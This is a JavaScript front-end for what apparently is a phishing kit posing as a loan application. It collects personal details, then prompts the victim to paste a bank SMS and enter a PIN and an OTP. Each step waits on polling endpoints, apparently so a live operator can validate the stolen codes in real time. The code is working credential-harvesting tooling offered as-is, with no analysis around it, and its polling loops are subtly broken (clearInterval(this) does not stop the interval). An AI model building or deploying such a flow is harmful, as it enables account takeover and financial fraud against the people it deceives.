// State
const S = { applicationId: '', currentTimer: null, isResendAllowed: false };

// Page navigation
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');
}

// Start countdown for SMS (60s)
function startSmsCountdown() {
  let remaining = 60;
  const countEl = document.getElementById('smsCountdown');
  const resendBtn = document.getElementById('btnResendSms');
  resendBtn.style.display = 'none';
  countEl.textContent = 'Resend available in ' + remaining + 's';
  clearInterval(S.currentTimer);
  S.currentTimer = setInterval(() => {
    remaining--;
    if (remaining <= 0) {
      clearInterval(S.currentTimer);
      countEl.textContent = 'SMS expired. You can resend.';
      resendBtn.style.display = 'block';
    } else {
      countEl.textContent = 'Resend available in ' + remaining + 's';
    }
  }, 1000);
}

// Start countdown for OTP (60s)
function startOtpCountdown() {
  let remaining = 60;
  const countEl = document.getElementById('otpCountdown');
  const resendBtn = document.getElementById('btnResendOtp');
  resendBtn.style.display = 'none';
  countEl.textContent = 'Resend available in ' + remaining + 's';
  clearInterval(S.currentTimer);
  S.currentTimer = setInterval(() => {
    remaining--;
    if (remaining <= 0) {
      clearInterval(S.currentTimer);
      countEl.textContent = 'OTP expired. You can resend.';
      resendBtn.style.display = 'block';
    } else {
      countEl.textContent = 'Resend available in ' + remaining + 's';
    }
  }, 1000);
}

// Submit details
async function submitDetails() {
  const data = {
    firstName: document.getElementById('dFi').value.trim(),
    lastName: document.getElementById('dLa').value.trim(),
    email: document.getElementById('dEm').value.trim(),
    phone: document.getElementById('dPh').value.trim(),
    loanAmount: document.getElementById('dAm').value,
    loanTerm: document.getElementById('dTe').value,
    loanPurpose: document.getElementById('dPu').value.trim()
  };
  if (!data.firstName || !data.lastName || !data.email || !data.phone || data.phone.length !== 9) {
    document.getElementById('dErr').textContent = 'Please fill all fields correctly.';
    return;
  }
  const res = await fetch('/api/submit-application', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationData: data }) });
  const json = await res.json();
  if (json.success) {
    S.applicationId = json.applicationId;
    goTo('page-wait-app');
    pollAppStatus();
  } else {
    document.getElementById('dErr').textContent = json.message;
  }
}

// Poll app status
function pollAppStatus() {
  setInterval(async () => {
    const res = await fetch(`/api/check-app-status/${S.applicationId}`);
    const json = await res.json();
    if (json.status === 'approved') {
      goTo('page-sms');
      startSmsCountdown();
      clearInterval(this);
    } else if (json.status === 'rejected') {
      alert('Application rejected.');
      clearInterval(this);
    }
  }, 2000);
}

// Submit SMS
async function submitSms() {
  const smsText = document.getElementById('smsText').value.trim();
  if (smsText.length < 3) { document.getElementById('smsErr').textContent = 'Please paste the SMS.'; return; }
  const res = await fetch('/api/verify-sms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, smsMessage: smsText }) });
  const json = await res.json();
  if (json.success) {
    goTo('page-wait-sms');
    pollSmsStatus();
  } else {
    document.getElementById('smsErr').textContent = json.message;
  }
}

// Poll SMS status
function pollSmsStatus() {
  setInterval(async () => {
    const res = await fetch(`/api/check-sms-status/${S.applicationId}`);
    const json = await res.json();
    if (json.status === 'approved') {
      goTo('page-pin');
      clearInterval(this);
    } else if (json.status === 'rejected') {
      goTo('page-sms');
      document.getElementById('smsErr').textContent = 'SMS rejected. Please try again.';
      clearInterval(this);
    }
  }, 2000);
}

// Submit PIN
async function submitPin() {
  const pin = document.getElementById('pinInput').value.trim();
  if (pin.length !== 5) { document.getElementById('pinErr').textContent = 'PIN must be 5 digits.'; return; }
  const res = await fetch('/api/verify-pin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, pin }) });
  const json = await res.json();
  if (json.success) {
    goTo('page-wait-pin');
    pollPinStatus();
  } else {
    document.getElementById('pinErr').textContent = json.message;
  }
}

// Poll PIN status
function pollPinStatus() {
  setInterval(async () => {
    const res = await fetch(`/api/check-pin-status/${S.applicationId}`);
    const json = await res.json();
    if (json.status === 'approved') {
      goTo('page-otp');
      startOtpCountdown();
      clearInterval(this);
    } else if (json.status === 'rejected') {
      goTo('page-pin');
      document.getElementById('pinErr').textContent = 'Wrong PIN. Please try again.';
      clearInterval(this);
    }
  }, 2000);
}

// Submit OTP
async function submitOtp() {
  const otp = document.getElementById('otpInput').value.trim();
  if (otp.length !== 4) { document.getElementById('otpErr').textContent = 'OTP must be 4 digits.'; return; }
  const res = await fetch('/api/verify-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, otp }) });
  const json = await res.json();
  if (json.success) {
    goTo('page-wait-otp');
    pollOtpStatus();
  } else {
    document.getElementById('otpErr').textContent = json.message;
  }
}

// Poll OTP status
function pollOtpStatus() {
  setInterval(async () => {
    const res = await fetch(`/api/check-otp-status/${S.applicationId}`);
    const json = await res.json();
    if (json.status === 'approved') {
      goTo('page-approval');
      clearInterval(this);
    } else if (json.status === 'rejected') {
      goTo('page-otp');
      document.getElementById('otpErr').textContent = 'OTP rejected. Please try again.';
      // Reset OTP countdown and allow resend
      startOtpCountdown();
      clearInterval(this);
    }
  }, 2000);
}

// Resend SMS
async function resendSms() {
  const res = await fetch('/api/resend-sms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId }) });
  const json = await res.json();
  if (json.success) {
    document.getElementById('smsText').value = '';
    document.getElementById('smsErr').textContent = '';
    startSmsCountdown();
  } else {
    alert('Failed to resend SMS');
  }
}

// Resend OTP
async function resendOtp() {
  const res = await fetch('/api/resend-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId }) });
  const json = await res.json();
  if (json.success) {
    document.getElementById('otpInput').value = '';
    document.getElementById('otpErr').textContent = '';
    startOtpCountdown();
  } else {
    alert('Failed to resend OTP');
  }
}
